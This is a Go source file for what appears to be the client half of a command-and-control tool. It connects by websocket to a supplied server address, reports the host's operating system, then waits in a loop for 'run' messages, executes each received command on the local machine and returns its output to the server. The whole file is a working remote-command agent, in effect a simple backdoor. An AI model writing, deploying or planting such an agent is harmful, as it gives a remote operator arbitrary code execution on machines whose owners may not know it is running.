package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"runtime"

	"github.com/gorilla/websocket"
	"github.com/pscherz/cc/data"
)

func Init(address string) {
	conn, res, err := websocket.DefaultDialer.Dial(fmt.Sprintf("ws://%s/cc/ep", address), make(http.Header))
	if err != nil {
		log.Fatal(err)
	}

	if res.StatusCode != http.StatusSwitchingProtocols {
		log.Fatalf("not expected 101 (Switching Protocols): %v (%v)", res.StatusCode, res.Status)
	}

	log.Print("sending init message")
	cntnt, err := json.Marshal(data.InitMessage{Os: runtime.GOOS, Name: "TODO"})
	if err != nil {
		log.Fatal(err)
	}
	err = conn.WriteJSON(data.Message{Content: string(cntnt), Type: "init"})
	if err != nil {
		log.Fatal(err)
	}
	log.Print("wrote init message")

	messaging(conn)
}

func messaging(conn *websocket.Conn) {
	defer conn.Close()

	var msg data.Message
	for {
		log.Print("awaiting command")
		err := conn.ReadJSON(&msg)
		if err != nil {
			log.Println("err: ", err)
			return
		}
		log.Printf("got message: %q", msg.Type)
		if msg.Type == "run" {

			var runcmd data.RunCmd
			json.Unmarshal([]byte(msg.Content), &runcmd)
			cmd := exec.Command(runcmd.Cmd)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				log.Printf("error opening cmd stdout pipe: %v", err)
			}
			log.Printf("waiting for cmd to finish (%q)...", runcmd.Cmd)

			err = cmd.Start()
			if err != nil {
				log.Printf("error running cmd: %v", err)
			}

			buf := make([]byte, 1024)
			s := bytes.NewBuffer(buf)
			io.Copy(s, stdout)
			runcmd.Output = s.String()
			log.Printf("cmd output (%q): %v", runcmd.Cmd, runcmd.Output)
			cmd.Wait()

			rescontent, _ := json.Marshal(runcmd)
			conn.WriteJSON(data.Message{Content: string(rescontent), Type: msg.Type})
		}
	}
}
